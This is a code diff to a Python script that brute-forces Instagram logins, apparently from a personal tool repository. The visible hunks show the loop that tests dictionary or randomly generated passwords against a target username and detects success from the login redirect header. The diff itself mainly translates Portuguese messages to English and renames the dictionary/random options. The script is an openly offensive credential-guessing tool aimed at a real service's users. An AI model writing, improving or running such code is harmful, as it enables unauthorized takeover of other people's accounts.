@@ -1,4 +1,3 @@
-
 import requests
 import time
 import re
@@ -57,23 +56,23 @@ def brute_force(username, password_source, dictionary=None, password_length=None
                 time.sleep(1)
 
                 if 'location' in response.headers and response.headers['location'] == 'https://www.instagram.com/':
-                    print(f"Login sucedido! - Usuario: {username}, Senha: {password}")
+                    print(f"Successful login - Username: {username}, Password: {password}")
                     return
                 else:
-                    print(f"login não sucedido - Usuario: {username}, senha: {password}")
+                    print(f"Unsuccessful login - Username: {username}, Password: {password}")
 
     except Exception as e:
         print(f"An error occurred: {str(e)}")
 
 def main():
-    print("==== Força Bruta ====")
+    print("==== Força Bruta (modo terminal) ====")
     username = input("Digite o nome de usuário: ")
-    password_source = input("Tipo de senha (arquivo/aleatoria): ")
+    password_source = input("Tipo de senha (dictionary/random): ")
 
-    if password_source == 'arquivo':
+    if password_source == 'dictionary':
         dictionary = input("Nome do arquivo de dicionário (sem .txt): ")
         brute_force(username, password_source, dictionary=dictionary)
-    elif password_source == 'aleatoria':
+    elif password_source == 'random':
         length = int(input("Comprimento da senha: "))
         strength = input("Força da senha (weak/medium/strong): ")
         brute_force(username, password_source, password_length=length, password_strength=strength)
